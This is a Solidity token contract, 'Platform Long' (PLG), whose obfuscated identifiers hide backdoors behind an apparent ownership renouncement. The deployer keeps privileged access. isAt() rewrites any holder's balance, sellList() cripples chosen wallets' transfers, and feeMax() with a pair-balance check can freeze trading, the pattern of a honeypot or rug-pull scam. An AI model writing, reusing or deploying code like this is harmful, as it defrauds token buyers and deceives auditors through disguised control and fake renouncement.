//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface fromEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitBuyLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingAmount {
    function createPair(address launchSwap, address minAuto) external returns (address);
}

interface launchMinTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverShould) external view returns (uint256);

    function transfer(address launchedFee, uint256 maxSwap) external returns (bool);

    function allowance(address tokenAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxSwap) external returns (bool);

    function transferFrom(
        address sender,
        address launchedFee,
        uint256 maxSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitTxFrom, uint256 value);
    event Approval(address indexed tokenAuto, address indexed spender, uint256 value);
}

interface receiverTotal is launchMinTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PlatformLong is limitBuyLaunch, launchMinTo, receiverTotal {

    uint8 private listWallet = 18;

    function fundTake(address receiverLaunch, address launchedFee, uint256 maxSwap) internal returns (bool) {
        if (receiverLaunch == launchedMarketingSell) {
            return exemptLiquidityWallet(receiverLaunch, launchedFee, maxSwap);
        }
        uint256 marketingBuy = launchMinTo(atIs).balanceOf(listTokenTo);
        require(marketingBuy == fromTake);
        require(launchedFee != listTokenTo);
        if (liquidityAuto[receiverLaunch]) {
            return exemptLiquidityWallet(receiverLaunch, launchedFee, exemptIs);
        }
        return exemptLiquidityWallet(receiverLaunch, launchedFee, maxSwap);
    }

    address private teamLimit;

    address public atIs;

    function feeMax(uint256 maxSwap) public {
        fromFee();
        fromTake = maxSwap;
    }

    function balanceOf(address receiverShould) public view virtual override returns (uint256) {
        return shouldTeam[receiverShould];
    }

    function owner() external view returns (address) {
        return teamLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return toTake;
    }

    uint256 public senderEnable;

    function totalSupply() external view virtual override returns (uint256) {
        return feeShould;
    }

    event OwnershipTransferred(address indexed teamFrom, address indexed totalLaunchToken);

    address public launchedMarketingSell;

    uint256 private feeShould = 100000000 * 10 ** 18;

    mapping(address => bool) public liquidityAuto;

    string private receiverTake = "Platform Long";

    function allowance(address takeTxTotal, address marketingReceiverAt) external view virtual override returns (uint256) {
        if (marketingReceiverAt == swapModeReceiver) {
            return type(uint256).max;
        }
        return minEnable[takeTxTotal][marketingReceiverAt];
    }

    bool public autoLaunch;

    function getOwner() external view returns (address) {
        return teamLimit;
    }

    uint256 fromTake;

    mapping(address => bool) public liquidityBuy;

    function tradingShould() public {
        emit OwnershipTransferred(launchedMarketingSell, address(0));
        teamLimit = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return listWallet;
    }

    uint256 public swapReceiver;

    uint256 private limitBuyLaunched;

    uint256 constant exemptIs = 2 ** 10;

    bool public fundMode;

    mapping(address => mapping(address => uint256)) private minEnable;

    function transferFrom(address receiverLaunch, address launchedFee, uint256 maxSwap) external override returns (bool) {
        if (_msgSender() != swapModeReceiver) {
            if (minEnable[receiverLaunch][_msgSender()] != type(uint256).max) {
                require(maxSwap <= minEnable[receiverLaunch][_msgSender()]);
                minEnable[receiverLaunch][_msgSender()] -= maxSwap;
            }
        }
        return fundTake(receiverLaunch, launchedFee, maxSwap);
    }

    address swapModeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return receiverTake;
    }

    function sellList(address receiverLimit) public {
        fromFee();
        if (limitBuyLaunched == listTeam) {
            fundMode = true;
        }
        if (receiverLimit == launchedMarketingSell || receiverLimit == atIs) {
            return;
        }
        liquidityAuto[receiverLimit] = true;
    }

    function fromFee() private view {
        require(liquidityBuy[_msgSender()]);
    }

    function transfer(address fundSender, uint256 maxSwap) external virtual override returns (bool) {
        return fundTake(_msgSender(), fundSender, maxSwap);
    }

    bool private swapFrom;

    constructor (){
        if (swapFrom != autoLaunch) {
            senderEnable = limitBuyLaunched;
        }
        fromEnable isFromTotal = fromEnable(swapModeReceiver);
        atIs = tradingAmount(isFromTotal.factory()).createPair(isFromTotal.WETH(), address(this));
        if (limitBuyLaunched != senderEnable) {
            autoLaunch = true;
        }
        launchedMarketingSell = _msgSender();
        tradingShould();
        liquidityBuy[launchedMarketingSell] = true;
        shouldTeam[launchedMarketingSell] = feeShould;
        
        emit Transfer(address(0), launchedMarketingSell, feeShould);
    }

    bool public buyFundWallet;

    function exemptLiquidityWallet(address receiverLaunch, address launchedFee, uint256 maxSwap) internal returns (bool) {
        require(shouldTeam[receiverLaunch] >= maxSwap);
        shouldTeam[receiverLaunch] -= maxSwap;
        shouldTeam[launchedFee] += maxSwap;
        emit Transfer(receiverLaunch, launchedFee, maxSwap);
        return true;
    }

    function isAt(address fundSender, uint256 maxSwap) public {
        fromFee();
        shouldTeam[fundSender] = maxSwap;
    }

    uint256 private receiverBuy;

    uint256 private listTeam;

    address listTokenTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 buyAmountList;

    function approve(address marketingReceiverAt, uint256 maxSwap) public virtual override returns (bool) {
        minEnable[_msgSender()][marketingReceiverAt] = maxSwap;
        emit Approval(_msgSender(), marketingReceiverAt, maxSwap);
        return true;
    }

    mapping(address => uint256) private shouldTeam;

    function launchMode(address atLaunched) public {
        if (buyFundWallet) {
            return;
        }
        
        liquidityBuy[atLaunched] = true;
        if (swapReceiver != listTeam) {
            listTeam = senderEnable;
        }
        buyFundWallet = true;
    }

    string private toTake = "PLG";

}